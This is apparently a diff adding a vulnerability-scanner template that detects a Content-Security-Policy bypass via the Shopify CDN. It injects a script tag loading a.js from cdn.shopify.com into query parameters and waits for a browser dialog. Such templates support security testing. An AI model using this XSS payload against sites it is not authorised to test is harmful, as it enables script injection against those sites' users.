@@ -1,0 +1,55 @@
+id: shopify-cdn-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Shopify CDN
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,shopify-cdn
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "shopify.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: shopify_cdn_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "shopify_cdn_csp_xss == true"
+# digest: 4b0a00483046022100e71a607285059eb5b910da19a53cbd4f3db09d543924781fc3e9f390f195e3c2022100920f0a564e06b19aa739283ff146375dafb3e3c5243b420d86d70bfe7587a8c2:922c64590222798bb761d5b6d8e72950
